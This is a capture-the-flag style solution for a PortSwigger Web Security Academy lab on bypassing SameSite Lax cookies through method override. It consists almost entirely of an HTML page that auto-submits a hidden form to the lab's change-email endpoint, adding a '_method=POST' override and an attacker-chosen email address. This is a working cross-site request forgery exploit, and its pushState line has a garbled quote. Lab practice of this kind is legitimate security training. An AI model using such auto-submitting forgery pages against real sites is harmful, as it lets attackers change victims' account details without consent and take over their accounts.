https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override

```html
<html>

<body>

<script>history.pushState(", ",'/')</script>

<form method="GET" action="https://0afd00bc0432b09780be17b1007f00f2.web-security-academy.net/my-account/change-email">
<input type="hidden" value="POST" name="_method">
<input type="hidden" value="pwned1@email.com" name="email">
<input type="submit" value="submit request">
</form>

<script>document.forms[0].submit();</script>

</body>

</html>
```